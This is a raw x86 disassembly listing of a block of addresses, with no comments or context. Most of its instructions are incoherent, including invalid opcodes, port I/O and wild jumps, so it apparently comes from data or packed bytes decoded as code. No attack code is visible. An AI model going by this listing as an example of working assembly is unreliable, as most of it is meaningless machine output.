  40ab9b:	sbb    BYTE PTR ds:0xd10aa7ee,bl
  40aba1:	shl    DWORD PTR [ebx+0x58],1
  40aba4:	sbb    DWORD PTR [edi+0x5c],ecx
  40aba7:	jbe    0x40abb7
  40aba9:	xor    cl,0x78
  40abac:	out    0x1,eax
  40abae:	mov    al,0x45
  40abb0:	xor    bh,dl
  40abb2:	stos   BYTE PTR es:[edi],al
  40abb3:	mov    esi,0x6f03c7f2
  40abb8:	jmp    0x858f28ad
  40abbd:	sub    DWORD PTR [ebx+0x63],eax
  40abc0:	int    0x24
  40abc2:	stc    
  40abc3:	or     BYTE PTR [ecx+0x7e],ah
  40abc6:	cmp    BYTE PTR [ebx],dh
  40abc8:	cdq    
  40abc9:	xchg   esp,eax
  40abca:	push   0x33
  40abcc:	inc    ecx
  40abcd:	repz cmp dl,BYTE PTR [esi]
  40abd0:	lea    esp,[ecx-0x13601c83]
  40abd6:	rcl    DWORD PTR [eax+0x415de52b],cl
  40abdc:	aaa    
  40abdd:	and    esi,DWORD PTR [ebx-0x5ccde32]
  40abe3:	inc    ecx
  40abe4:	dec    ebp
  40abe5:	jl     0x40ab88
  40abe7:	out    0xa9,al
  40abe9:	add    al,0xb0
  40abeb:	xchg   esp,eax
  40abec:	(bad)  
  40abed:	fdivr  QWORD PTR [edx-0x7ba66def]
  40abf3:	sbb    ecx,esp
  40abf5:	pop    esp
  40abf6:	or     DWORD PTR [edx-0x636d4d17],eax
  40abfc:	add    ch,0xbc
  40abff:	cs aad 0x0
  40ac02:	in     al,dx
  40ac03:	fistp  WORD PTR [esi-0x5c]
  40ac06:	outs   dx,DWORD PTR ds:[esi]
  40ac07:	and    DWORD PTR [eax-0x725eef42],ecx
  40ac0d:	popf   
  40ac0e:	scas   eax,DWORD PTR es:[edi]
  40ac0f:	inc    ecx
  40ac10:	icebp  
  40ac11:	xor    eax,0xb74fa045
  40ac16:	jns    0x40ac3e
  40ac18:	mov    ebp,0x78aa4054
  40ac1d:	adc    edi,ecx
  40ac1f:	xor    DWORD PTR [esi],ebx
  40ac21:	retf   0x645b
  40ac24:	in     al,0x42
  40ac26:	(bad)  
  40ac27:	xor    al,0xb6
  40ac29:	pushf  
  40ac2a:	in     eax,0x76
  40ac2c:	push   edi
  40ac2d:	popf   
  40ac2e:	popa   
  40ac2f:	fdivr  DWORD PTR [edx]
  40ac31:	popf   
  40ac32:	fstp   DWORD PTR [edx]
  40ac34:	cmp    BYTE PTR [edi+0x7f],0xd4
  40ac38:	out    dx,eax
  40ac39:	xchg   esi,eax
  40ac3a:	xchg   ebp,eax
  40ac3b:	cmp    ah,al
  40ac3d:	adc    BYTE PTR [edx],al
  40ac3f:	test   eax,esi
  40ac41:	and    DWORD PTR [eax-0x2efc06fd],ebp
  40ac47:	imul   edx,edi
  40ac4a:	mov    edi,DWORD PTR [ebp-0x8]
  40ac4d:	jmp    0x40afc0
  40ac52:	icebp  
  40ac53:	cs mov ah,0x3e
  40ac56:	ja     0x40ac9e
  40ac58:	jno    0x40ac8b
  40ac5a:	mov    esi,0x376a3c5e
  40ac5f:	jb     0x40ac56
  40ac61:	cmc    
  40ac62:	cmp    eax,0xca7c7cfc
  40ac67:	jns    0x40ace5
  40ac69:	jl     0x40ac9b
  40ac6b:	sbb    bl,ch
  40ac6d:	xor    ecx,DWORD PTR ds:0x49b64a
  40ac73:	mov    ch,BYTE PTR [edi+0x1f513506]
  40ac79:	rol    BYTE PTR [ecx],1
  40ac7b:	add    al,0x6
  40ac7d:	jnp    0x40acce
  40ac7f:	add    ebx,edi
  40ac81:	add    eax,0xc55f476a
  40ac86:	fcmovbe st,st(4)
  40ac88:	shl    DWORD PTR [esi-0x5b2a5f49],0x86
  40ac8f:	dec    edi
  40ac90:	cli    
  40ac91:	push   ebp
  40ac92:	xor    ebp,esi
  40ac94:	mov    ebp,0x2be1e417
  40ac99:	mov    cl,0xc2
  40ac9b:	sti    
  40ac9c:	add    esi,esi
  40ac9e:	(bad)  
  40ac9f:	mov    DWORD PTR [ebx+0x1d320cce],ebx
  40aca5:	xor    ah,BYTE PTR [esi+0x68]
  40aca8:	jns    0x40acf7
  40acaa:	sar    DWORD PTR [esi],0xcb
  40acad:	mov    edx,0xffb5d75b
  40acb2:	inc    edi
  40acb3:	mov    dh,BYTE PTR [esi+0x2c52aa28]
  40acb9:	jo     0x40ac7d
  40acbb:	sub    eax,0xdd6d5353
  40acc0:	mul    eax
  40acc2:	add    esi,esi
  40acc4:	and    ecx,esi
  40acc6:	dec    ecx
  40acc7:	xchg   edx,eax
  40acc8:	xor    eax,0x43f3d4f9
  40accd:	ins    BYTE PTR es:[edi],dx
  40acce:	aas    
  40accf:	pop    ebp
  40acd0:	loop   0x40aca7
  40acd2:	adc    al,0xc4
  40acd4:	(bad)  
  40acd6:	and    al,0x2c
  40acd8:	out    0xdb,al
  40acda:	inc    edx
  40acdb:	push   ebp
  40acdc:	(bad)  [esi]
  40acde:	test   DWORD PTR [esi-0x5e],0x98f56ad3
  40ace5:	aam    0xb1
  40ace7:	lds    ecx,FWORD PTR [ecx]
  40ace9:	popf   
  40acea:	daa    
  40aceb:	xor    al,0x30
  40aced:	add    DWORD PTR [edi+0x47],ebx
  40acf0:	rcr    DWORD PTR [edx+edi*8],cl
  40acf3:	(bad)  
  40acf4:	cli    
  40acf5:	int3   
  40acf6:	repz or eax,0x780ae2f4
  40acfc:	les    ecx,FWORD PTR [edx+edi*4-0x6d]
  40ad00:	sub    ebx,DWORD PTR [edx-0x51]
  40ad03:	inc    bh
  40ad05:	xchg   edx,eax
  40ad06:	mov    ecx,DWORD PTR [edx+0x62552a1f]
  40ad0c:	lods   al,BYTE PTR ds:[esi]
  40ad0d:	adc    DWORD PTR [esi+0x61],eax
  40ad10:	jbe    0x40ace4
  40ad12:	inc    ebx
  40ad13:	fst    DWORD PTR ds:0xe963fda4
  40ad19:	mov    ebp,0x2a7598e1
  40ad1e:	jb     0x40acde
  40ad20:	ins    BYTE PTR es:[edi],dx
  40ad21:	jmp    0x40acdd
  40ad23:	scas   eax,DWORD PTR es:[edi]
  40ad24:	aad    0x63
  40ad26:	pop    edi
  40ad27:	shl    ah,1
  40ad29:	sub    cl,BYTE PTR [eax+0x75]
  40ad2c:	mov    BYTE PTR [eax+0x5b],dh
  40ad2f:	add    eax,0x99e5d78
  40ad34:	and    al,0x2e
  40ad37:	rcr    DWORD PTR ds:0xb419472d,0xd2
  40ad3e:	mov    esi,0xbe1a083b
  40ad43:	adc    al,0x70
  40ad45:	je     0x40acd8
  40ad47:	xor    BYTE PTR [edi-0x41e1a331],cl
  40ad4d:	jmp    0x9577:0x4f430a7a
  40ad54:	fstp   QWORD PTR [ecx]
  40ad56:	mov    ah,0x4d
  40ad58:	(bad)  
  40ad59:	into   
  40ad5a:	test   BYTE PTR cs:[ebp+ebx*8-0x79],ch
  40ad5f:	add    DWORD PTR [eax-0x1e],ecx
  40ad62:	mov    eax,ds:0x8421cc8f
  40ad67:	mov    ch,BYTE PTR [ebp+ecx*2-0x12e7695b]
  40ad6e:	sub    al,0x24
  40ad70:	mov    DWORD PTR [ecx],ebp
  40ad72:	jmp    0x40ad6f
  40ad74:	mov    al,ds:0xe36ae42c
  40ad79:	jmp    0x40ad3b
  40ad7b:	sahf   
  40ad7c:	xchg   ebp,eax
  40ad7d:	ds mov ecx,0x478aa59c
  40ad83:	es in  eax,dx
  40ad85:	div    DWORD PTR [eax]
  40ad87:	fwait
  40ad88:	mov    ch,BYTE PTR [ebp+0x173e1022]
  40ad8e:	out    dx,al
  40ad8f:	pop    eax
  40ad90:	sbb    esi,ebx
  40ad92:	out    dx,eax
  40ad93:	fsubrp st(7),st
  40ad95:	ror    cl,1
  40ad97:	aad    0xb7
  40ad99:	adc    ebx,DWORD PTR fs:[edi]
  40ad9c:	xlat   BYTE PTR ds:[ebx]
  40ad9d:	pusha  
  40ad9e:	js     0x40add5
  40ada0:	adc    al,0xfe
  40ada2:	xor    dl,BYTE PTR [edx]
  40ada4:	clc    
  40ada5:	std    
  40ada6:	out    0x0,al
  40ada8:	pusha  
  40ada9:	xchg   edi,eax
  40adaa:	dec    ebx
  40adab:	data16 cld 
  40adad:	dec    edx
  40adae:	sbb    esp,edx
  40adb0:	and    eax,0x81634c46
  40adb5:	sar    ebp,0xc2
  40adb8:	pop    ds
  40adb9:	xchg   ebx,eax
  40adba:	dec    esi
  40adbb:	pop    ds
  40adbc:	test   al,0x73
  40adbe:	dec    ebx
  40adbf:	bound  edi,QWORD PTR [edi]
  40adc1:	adc    al,0xcb
  40adc3:	stos   DWORD PTR es:[edi],eax
  40adc4:	inc    edi
  40adc5:	push   ebp
  40adc6:	push   ss
  40adc7:	inc    edx
  40adc8:	jno    0x40ae3c
  40adca:	das    
  40adcb:	pop    ss
  40adcc:	ret    0xb65e
  40adcf:	add    ah,BYTE PTR [edi]
  40add1:	in     eax,0x9b
  40add3:	inc    ebp
  40add4:	hlt    
  40add5:	lods   al,BYTE PTR ds:[esi]
  40add6:	adc    DWORD PTR [ecx+0xa],esp
  40add9:	push   eax
  40adda:	jecxz  0x40addd
  40addc:	jge    0x40ad8e
  40adde:	xor    edi,edi
  40ade0:	out    dx,eax
  40ade1:	retf   
  40ade2:	retf   
  40ade3:	aas    
  40ade4:	add    DWORD PTR [esi+0x3c],esi
  40ade7:	adc    al,BYTE PTR fs:[ecx+0x22]
  40adeb:	aas    
  40adec:	add    dl,cl
  40adee:	test   DWORD PTR [bx+si+0xa88],edi
  40adf3:	dec    edx
  40adf4:	or     cl,BYTE PTR [edi-0x64]
  40adf7:	js     0x40adc4
  40adf9:	dec    ecx
  40adfa:	daa    
  40adfb:	jb     0x40ae3b
  40adfd:	ret    0x2371
  40ae00:	or     al,0x7a
  40ae02:	mov    edi,0x6a6ec172
  40ae07:	test   DWORD PTR [ebp-0x6c],edx
  40ae0a:	repz xor DWORD PTR ds:0xa39ea884,ebx
  40ae11:	das    
  40ae12:	or     eax,0x9af1ef0d
  40ae17:	inc    ebp
  40ae18:	jnp    0x40adcc
  40ae1a:	fiadd  WORD PTR [eax]
  40ae1c:	std    
  40ae1d:	and    DWORD PTR [ebp+0x51a63769],0xfffffffe
  40ae24:	jmp    esi
  40ae26:	aam    0x43
  40ae28:	test   al,0x60
  40ae2a:	sbb    cl,BYTE PTR [ecx-0x7d]
  40ae2d:	stc    
  40ae2e:	jo     0x40ae79
  40ae30:	and    BYTE PTR [ecx],cl
  40ae32:	loopne 0x40ae50
  40ae34:	test   al,0xb0
  40ae36:	xchg   DWORD PTR [esi+0xe7f12b4],ecx
  40ae3c:	push   0x74
  40ae3e:	dec    esi
  40ae3f:	mov    eax,0x9bb7b224
  40ae44:	dec    ebx
  40ae45:	xor    bl,bh
  40ae47:	(bad)  
  40ae48:	sbb    dh,BYTE PTR [ebx+eiz*2-0x14]
  40ae4c:	ret    0xef99
  40ae4f:	xchg   DWORD PTR [edi],edi
  40ae51:	xor    BYTE PTR ds:0x18d259fb,ah
  40ae57:	adc    al,0x4f
  40ae59:	jmp    0x57f904c0
  40ae5e:	stc    
  40ae5f:	fsubp  st(5),st
  40ae61:	xor    eax,DWORD PTR [esi+0x7c0c4d4d]
  40ae67:	int3   
  40ae68:	pop    DWORD PTR [ebp+0x71]
  40ae6b:	mov    ebx,0x2cd6323d
  40ae70:	dec    esp
  40ae71:	adc    eax,DWORD PTR [ebp-0x20c866ae]
  40ae77:	lea    ebx,[edx+0x2a780cb0]
  40ae7d:	aas    
  40ae7e:	dec    ebp
  40ae7f:	push   edx
  40ae80:	inc    eax
  40ae81:	add    al,0x8d
  40ae83:	pop    esp
  40ae84:	stos   DWORD PTR es:[edi],eax
  40ae85:	cld    
  40ae86:	neg    BYTE PTR [ecx+0x41]
  40ae89:	pop    es
  40ae8a:	nop
  40ae8b:	cmp    BYTE PTR [edx+0x66],0x18
  40ae8f:	cmp    eax,0x38ac8e2a
  40ae94:	in     al,dx
  40ae95:	or     edx,edx
  40ae97:	jbe    0x40ae2b
  40ae99:	(bad)  
  40ae9a:	in     al,0x22
  40ae9c:	inc    edi
  40ae9d:	cmc    
  40ae9e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40ae9f:	loopne 0x40af06
  40aea1:	retf   0x2b1c
  40aea4:	stos   BYTE PTR es:[edi],al
  40aea5:	xor    edx,ecx
  40aea7:	fnstenv [ebx-0x5f60ad7e]
  40aead:	push   0x236ad2b9
  40aeb2:	js     0x40aee7
  40aeb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aeb5:	lahf   
  40aeb6:	push   ebp
  40aeb7:	push   cs
  40aeb8:	outs   dx,BYTE PTR ds:[esi]
  40aeb9:	cdq    
  40aeba:	addr16 arpl dx,ax
  40aebd:	jmp    FWORD PTR [ebx+ebp*8]
  40aec0:	xchg   ebx,eax
  40aec1:	sbb    bl,BYTE PTR [edi-0x528044d]
  40aec7:	cwde   
  40aec8:	out    0x89,al
  40aeca:	fld    TBYTE PTR [edi]
  40aecc:	into   
  40aecd:	fsubp  st(3),st
  40aecf:	xchg   edi,eax
  40aed0:	cmp    DWORD PTR [esi+0x2a],esp
  40aed3:	mov    al,ds:0x51b181b5
  40aed8:	mov    bh,0xe9
  40aeda:	push   ebx
  40aedb:	mov    edi,0xaf9ed977
  40aee0:	out    0x22,al
  40aee2:	aad    0xaa
  40aee4:	fsubrp st(7),st
  40aee6:	(bad)  
  40aee7:	push   edi
  40aee8:	add    cl,dl
  40aeea:	hlt    
  40aeeb:	push   0x286f1882
  40aef0:	(bad)  
  40aef1:	push   edx
  40aef2:	leave  
  40aef3:	test   al,0xfd
  40aef5:	xchg   ebx,eax
  40aef6:	jnp    0x40af24
  40aef8:	pop    es
  40aef9:	aas    
  40aefa:	in     eax,dx
  40aefb:	jmp    0x40aeb0
  40aefd:	(bad)  
  40aefe:	mov    ds:0xd0986a6b,al
  40af03:	push   ebp
  40af05:	push   edx
  40af06:	mov    ds:0x7756e67f,al
  40af0b:	inc    eax
  40af0c:	test   DWORD PTR [esi-0x2afffa6],0x141bc2d
  40af16:	mov    ch,0xc0
  40af18:	xor    DWORD PTR [edx-0x1b],0x59
  40af1c:	mov    esp,0xe6043f5d
  40af21:	mov    dl,0x93
  40af23:	xchg   edx,eax
  40af24:	fisub  DWORD PTR [edi-0x37]
  40af27:	cld    
  40af28:	add    eax,0x7cd1376d
  40af2d:	mov    ah,0x73
  40af2f:	push   cs
  40af30:	pmulhw mm6,QWORD PTR es:[edx+ecx*8+0x179b5bd5]
  40af39:	inc    ebp
  40af3a:	iret   
  40af3b:	sahf   
  40af3c:	rol    DWORD PTR [esp+eax*1],0xd2
  40af40:	cmp    al,0x97
  40af42:	retf   0x3e9b
  40af45:	dec    edx
  40af46:	stc    
  40af47:	outs   dx,BYTE PTR ds:[esi]
  40af48:	imul   esi,DWORD PTR [ecx+eax*2+0x37],0x10ff6b96
  40af50:	(bad)  
  40af51:	loope  0x40af1a
  40af53:	sub    ebp,DWORD PTR [edx+0x696c414c]
  40af59:	mov    bh,0x71
  40af5b:	mov    al,ds:0x82ea1bd9
  40af60:	iret   
  40af61:	mov    ds,WORD PTR [edi+0x30123e30]
  40af67:	jp     0x40afb2
  40af69:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af6a:	push   es
  40af6b:	rcl    DWORD PTR [esi+ecx*4-0x5a],cl
  40af6f:	mov    eax,DWORD PTR [ecx*4+0x12274908]
  40af76:	jnp    0x40af2d
  40af78:	(bad)  
  40af79:	jmp    0xa9eb3709
  40af7e:	inc    edi
  40af7f:	popf   
  40af80:	mov    esp,0x7376d0c
  40af85:	lock push ss
  40af87:	ret    0x98b2
  40af8a:	push   edx
  40af8b:	sbb    dl,bh
  40af8d:	or     BYTE PTR [edx],0xc0
  40af90:	and    esi,DWORD PTR [esi+edi*2-0x31fda338]
  40af97:	mov    ch,0xfc
  40af99:	or     al,0xd9
  40af9b:	popa   
  40af9c:	jecxz  0x40affb
  40af9e:	imul   ecx,DWORD PTR [eax+0x2352a036],0x7f63ed8f
  40afa8:	shr    DWORD PTR [edx+ebx*8+0x69],1
  40afac:	push   edx
  40afad:	jo     0x40af97
  40afaf:	cmovs  esp,DWORD PTR [esi-0x79]
  40afb3:	push   ecx
  40afb4:	cli    
  40afb5:	ins    BYTE PTR es:[edi],dx
  40afb6:	add    cl,0x6c
  40afb9:	pop    edx
  40afba:	mov    db6,edi
  40afbd:	cmp    eax,0x5d8b05a4
  40afc2:	lock sub ebx,edi
  40afc5:	cmp    ebx,edx
  40afc7:	ja     0x40afd5
  40afcd:	mov    edx,DWORD PTR [ebp-0x2c]
  40afd0:	jmp    0x40baa7
  40afd5:	mov    edx,DWORD PTR [ebp-0x34]
  40afd8:	mov    edi,DWORD PTR [ebp-0x4]
  40afdb:	xor    edx,eax
  40afdd:	xor    edi,eax
  40afdf:	add    edi,ecx
  40afe1:	add    edx,ecx
  40afe3:	imul   edx,edi
  40afe6:	mov    edi,DWORD PTR [ebp-0x8]
  40afe9:	mov    ebx,DWORD PTR [ebp-0x10]
  40afec:	sub    ebx,edi
  40afee:	jmp    0x40b361
  40aff3:	rcr    BYTE PTR [esi-0x6b],0x3c
  40aff7:	mov    ebp,0xb3625deb
  40affc:	jecxz  0x40af85
  40affe:	fcom   DWORD PTR [ecx-0x74e19fdd]
  40b004:	stc    
  40b005:	jl     0x40b083
  40b007:	retf   0x7c79
  40b00a:	jl     0x40b01b
  40b00c:	sub    DWORD PTR [ecx-0x28],esp
  40b00f:	mov    edi,0x12c1e230
  40b014:	mov    dh,0x7e
  40b016:	lock add DWORD PTR [edx+0x1a],ecx
  40b01a:	sub    DWORD PTR [ebx-0x559f6d4],esp
  40b020:	fsubr  st(7),st
  40b022:	out    dx,eax
  40b023:	pop    eax
  40b024:	in     eax,0x6c
  40b026:	push   esp
  40b027:	icebp  
  40b028:	or     eax,0x249072f
  40b02d:	add    BYTE PTR [ecx+0x5d4ba283],ah
  40b033:	test   BYTE PTR [ebx-0x40ed1240],bh
  40b039:	arpl   WORD PTR [esi],bp
  40b03b:	stos   BYTE PTR es:[edi],al
  40b03c:	bound  ebp,QWORD PTR [ebp-0x371dd7b]
  40b042:	or     al,0x5
  40b044:	and    DWORD PTR [edx-0x2383f89e],eax
  40b04a:	add    DWORD PTR ds:0xefbf96c0,0x3f
  40b051:	mov    ch,0x20
  40b053:	out    0xbd,eax
  40b055:	repz push 0x6a
  40b058:	int3   
  40b059:	ins    BYTE PTR es:[edi],dx
  40b05a:	popf   
  40b05b:	fwait
  40b05c:	popf   
  40b05d:	je     0x40b08a
  40b05f:	inc    ecx
  40b060:	scas   al,BYTE PTR es:[edi]
  40b061:	dec    edx
  40b062:	lods   eax,DWORD PTR ds:[esi]
  40b063:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b064:	fsubr  QWORD PTR [esi+edi*8+0x4b]
  40b068:	pop    ebx
  40b069:	mov    ebx,0x57df7be6
  40b06e:	sub    eax,0x8c9977b3
  40b073:	sub    edi,DWORD PTR [ebx]
  40b075:	and    eax,DWORD PTR ss:[esi-0x129a2653]
  40b07c:	dec    ebp
  40b07d:	mov    DWORD PTR [edx+0x32],0x6f3a2bd2
  40b084:	push   ebp
  40b085:	sbb    DWORD PTR [ecx+esi*2+0xb8be789],ebx
  40b08c:	dec    ebp
  40b08d:	inc    eax
  40b08e:	cmp    BYTE PTR [ebx+0x24],bh
  40b091:	jbe    0x40b105
  40b093:	pop    es
  40b094:	aad    0x87
  40b096:	in     eax,0x93
  40b098:	adc    al,0xdf
  40b09a:	cmp    al,0xda
  40b09c:	jmp    0x40b031
  40b09e:	jns    0x40b0d7
  40b0a0:	xor    eax,0xeeb55391
  40b0a5:	lahf   
  40b0a6:	push   es
  40b0a7:	repnz das 
  40b0a9:	jb     0x40b105
  40b0ab:	sar    BYTE PTR [edx+0x78562e88],cl
  40b0b1:	mov    ebp,DWORD PTR [ebx]
  40b0b3:	neg    DWORD PTR [esi-0x6c]
  40b0b6:	sbb    dl,BYTE PTR [ecx-0x28]
  40b0b9:	push   cs
  40b0ba:	adc    BYTE PTR [edx],bl
  40b0bc:	repz cmps DWORD PTR fs:[esi],DWORD PTR es:[edi]
  40b0bf:	jbe    0x40b06c
  40b0c1:	or     BYTE PTR [ecx-0x71],cl
  40b0c4:	push   0xa0d3251
  40b0c9:	xor    ecx,DWORD PTR [ebx]
  40b0cb:	loopne 0x40b143
  40b0cd:	loop   0x40b14b
  40b0cf:	in     al,0x7c
  40b0d1:	jg     0x40b107
  40b0d3:	ret    
  40b0d4:	adc    al,0xd1
  40b0d6:	mov    WORD PTR [esp+ebp*1+0x7aa984b9],ss
  40b0dd:	mov    edx,0x9e90ce5
  40b0e2:	cmc    
  40b0e3:	cli    
  40b0e4:	or     ch,BYTE PTR [edx+ebx*2]
  40b0e7:	inc    ebp
  40b0e8:	lods   eax,DWORD PTR ds:[esi]
  40b0e9:	mov    ds:0xe4c6da00,eax
  40b0ee:	mov    ds:0x2f28977,al
  40b0f3:	mov    al,ds:0x9b858559
  40b0f8:	xchg   ebx,eax
  40b0f9:	dec    esi
  40b0fa:	mov    ch,0x16
  40b0fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0fd:	mov    fs,WORD PTR [esi+0x104d9c52]
  40b103:	add    DWORD PTR [ecx+0x3b],ebx
  40b106:	mov    eax,ds:0x9f85bac7
  40b10b:	das    
  40b10c:	mov    ebp,0x33a4a1fa
  40b111:	jb     0x40b120
  40b113:	(bad)  
  40b114:	loopne 0x40b10b
  40b116:	dec    eax
  40b117:	inc    eax
  40b118:	xchg   esi,eax
  40b119:	or     DWORD PTR [ebx],esp
  40b11b:	sbb    cl,BYTE PTR [ebp-0x61]
  40b11e:	fs push ds
  40b120:	pop    ss
  40b121:	enter  0x5f58,0x29
  40b125:	fsubp  st(1),st
  40b127:	mov    bh,0x2
  40b129:	cs cmp eax,0x70a3fcfd
  40b12f:	sbb    BYTE PTR [eax],cl
  40b131:	add    al,0x9c
  40b133:	xchg   DWORD PTR ds:0x57b26651,esi
  40b139:	cmp    ebp,eax
  40b13b:	clc    
  40b13c:	idiv   DWORD PTR [edi-0x3]
  40b13f:	jae    0x40b15b
  40b141:	xchg   esi,eax
  40b142:	xlat   BYTE PTR ds:[ebx]
  40b143:	mov    ds:0x74b5568,al
  40b148:	popa   
  40b149:	cmp    BYTE PTR [ebx+ecx*2],bl
  40b14c:	jne    0x40b16f
  40b14e:	sbb    BYTE PTR [ecx+0x50],0x55
  40b152:	xchg   esp,eax
  40b153:	fwait
  40b154:	adc    BYTE PTR [ebp+0xbdb2948],ch
  40b15a:	inc    edx
  40b15b:	push   esi
  40b15c:	xchg   edx,eax
  40b15d:	and    al,0x19
  40b15f:	mov    esp,0xb3860fb3
  40b164:	jbe    0x40b179
  40b166:	fstp   TBYTE PTR [eax+edx*4]
  40b169:	jae    0x40b13e
  40b16b:	jne    0x40b177
  40b16d:	push   edx
  40b16e:	ret    0xcef7
  40b171:	or     eax,0x593651a7
  40b176:	push   edi
  40b177:	pop    edi
  40b178:	iret   
  40b179:	xchg   edx,eax
  40b17a:	call   0x4b374ef4
  40b17f:	lods   eax,DWORD PTR ds:[esi]
  40b180:	cmc    
  40b181:	ins    DWORD PTR es:[edi],dx
  40b182:	pop    eax
  40b183:	mov    esp,0x15b00a38
  40b188:	es mov ebx,0x33e7d064
  40b18e:	in     eax,0x9d
  40b190:	push   0x94a4ef00
  40b195:	fsub   DWORD PTR [eax+0x11149471]
  40b19b:	xchg   ch,dh
  40b19d:	mov    ds:0x8fd255d3,eax
  40b1a2:	jnp    0x40b213
  40b1a4:	ja     0x40b13d
  40b1a6:	stos   DWORD PTR es:[edi],eax
  40b1a7:	out    0x62,eax
  40b1a9:	or     al,0x19
  40b1ab:	sar    DWORD PTR ds:0xaf12ead4,0xc0
  40b1b2:	mov    BYTE PTR [ecx-0x4e],ah
  40b1b5:	jno    0x40b1d1
  40b1b7:	mov    al,ds:0x69631231
  40b1bc:	inc    ebx
  40b1bd:	sar    DWORD PTR [eax],1
  40b1bf:	mov    DWORD PTR [esi+0x41],esp
  40b1c2:	mov    ds:0x68824e6c,eax
  40b1c7:	shl    BYTE PTR [eax-0x73],1
  40b1ca:	sar    BYTE PTR [edi+0x33bb446a],0xba
  40b1d1:	fisttp QWORD PTR [edx]
  40b1d3:	mov    cl,al
  40b1d5:	stos   BYTE PTR es:[edi],al
  40b1d6:	inc    edi
  40b1d7:	outs   dx,BYTE PTR ds:[esi]
  40b1d8:	test   BYTE PTR [edi-0x21],dh
  40b1db:	cdq    
  40b1dc:	rcl    ch,cl
  40b1de:	add    eax,0xa42b183e
  40b1e3:	idiv   BYTE PTR [esi-0x7373279c]
  40b1e9:	pusha  
  40b1ea:	les    esi,FWORD PTR [ebp+0x41ea440]
  40b1f0:	sub    dl,BYTE PTR [ecx+eax*8+0x7eb96c93]
  40b1f7:	mov    ah,BYTE PTR ds:0xf3971453
  40b1fd:	ss out dx,eax
  40b1ff:	cmp    al,BYTE PTR [ecx-0x351f0a84]
  40b205:	int    0x74
  40b207:	xor    ecx,DWORD PTR [esi]
  40b209:	retf   
  40b20a:	xor    BYTE PTR [edi+0x15],dh
  40b20d:	pop    ebx
  40b20e:	fisub  WORD PTR [edi+0x20e31e89]
  40b214:	in     al,0xef
  40b216:	dec    edi
  40b217:	mov    esi,0x62f605f6
  40b21c:	sahf   
  40b21d:	loopne 0x40b1d9
  40b21f:	clc    
  40b220:	sub    BYTE PTR [edi-0x13],dh
  40b223:	mov    edi,es
  40b225:	push   esp
  40b226:	push   eax
  40b227:	in     al,dx
  40b228:	in     eax,0x8
  40b22a:	loope  0x40b256
  40b22c:	popf   
  40b22d:	jge    0x40b26c
  40b22f:	mov    esi,DWORD PTR [esi+0x17]
  40b232:	test   DWORD PTR [ebp+0x162bd1d5],ebx
  40b238:	pop    eax
  40b239:	inc    esi
  40b23a:	mov    edi,esi
  40b23c:	cs fstp st(2)
  40b23f:	adc    eax,0xeb612040
  40b244:	pop    edi
  40b245:	outs   dx,DWORD PTR ds:[esi]
  40b246:	leave  
  40b247:	adc    BYTE PTR [ebx+edi*2-0x7d474125],0x68
  40b24f:	push   esp
  40b250:	xor    edx,edi
  40b252:	aas    
  40b253:	lds    dx,DWORD PTR [edi-0x28]
  40b257:	dec    eax
  40b258:	pop    eax
  40b259:	aam    0x52
  40b25b:	pusha  
  40b25c:	sbb    eax,0x76b352b6
  40b261:	lahf   
  40b262:	loop   0x40b26a
  40b264:	stc    
  40b265:	or     BYTE PTR [esi],0x18
  40b268:	into   
  40b269:	in     al,dx
  40b26a:	push   edx
  40b26b:	aas    
  40b26c:	lock or bh,BYTE PTR [edx]
  40b26f:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b271:	cmp    DWORD PTR [edx],ecx
  40b273:	mov    edx,0xe6aafbf6
  40b278:	nop
  40b279:	lds    esp,FWORD PTR es:[esi-0x29670642]
  40b280:	(bad)  
  40b281:	adc    bl,BYTE PTR [edi]
  40b283:	push   ebx
  40b284:	shl    ebp,0x4c
  40b287:	leave  
  40b288:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b289:	xchg   BYTE PTR [ebx+0x24],bh
  40b28c:	jb     0x40b23c
  40b28e:	out    dx,eax
  40b28f:	popf   
  40b290:	out    0x25,al
  40b292:	ret    0x8c49
  40b295:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b296:	enter  0xf6ab,0x8
  40b29a:	arpl   cx,sp
  40b29c:	ret    0x2ba4
  40b29f:	jmp    0x12f0:0xf59a7983
  40b2a6:	int3   
  40b2a7:	push   ebp
  40b2a8:	mov    dh,0xad
  40b2aa:	xchg   edi,eax
  40b2ab:	adc    DWORD PTR [eax-0x15b10d68],eax
  40b2b1:	pop    esi
  40b2b2:	mov    eax,0xddb2a6c3
  40b2b7:	and    BYTE PTR [esi+ebx*2],0xb1
  40b2bb:	mov    al,ds:0x4eafe4e9
  40b2c0:	sub    DWORD PTR [eax-0x4ec0082d],ebp
  40b2c6:	sub    ecx,DWORD PTR [ebx-0x59]
  40b2c9:	es (bad) 
  40b2cb:	aaa    
  40b2cc:	out    0x10,al
  40b2ce:	enter  0xf451,0xd2
  40b2d2:	mov    esp,0x867ab89a
  40b2d7:	jge    0x40b336
  40b2d9:	pop    ds
  40b2da:	inc    esp
  40b2db:	xchg   edx,eax
  40b2dc:	mov    dh,bl
  40b2de:	add    DWORD PTR [ebp+0x1401aafb],0xffffff9f
  40b2e5:	cs rcl esp,1
  40b2e8:	scas   al,BYTE PTR es:[edi]
  40b2e9:	mov    ds:0x6997b69d,eax
  40b2ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b2ef:	sti    
  40b2f0:	test   BYTE PTR [esi],ch
  40b2f2:	lods   eax,DWORD PTR ds:[esi]
  40b2f3:	sub    ch,BYTE PTR [edx]
  40b2f5:	dec    eax
  40b2f6:	fs push ebx
  40b2f9:	mov    WORD PTR [edx+0x68],?
  40b2fc:	and    eax,0x6729e91a
  40b301:	mov    ds:0x54334958,eax
  40b306:	icebp  
  40b307:	loope  0x40b345
  40b309:	imul   edx,DWORD PTR [ebp-0x51],0x2186e585
  40b310:	pop    eax
  40b311:	rcr    DWORD PTR [ebp+0x5a],0x81
  40b315:	dec    ecx
  40b316:	mov    BYTE PTR [esi-0x22c954ba],dl
  40b31c:	je     0x40b2c5
  40b31e:	mov    ch,0x4d
  40b320:	xchg   ecx,eax
  40b321:	ins    DWORD PTR es:[edi],dx
  40b322:	test   DWORD PTR [eax+edi*2],edx
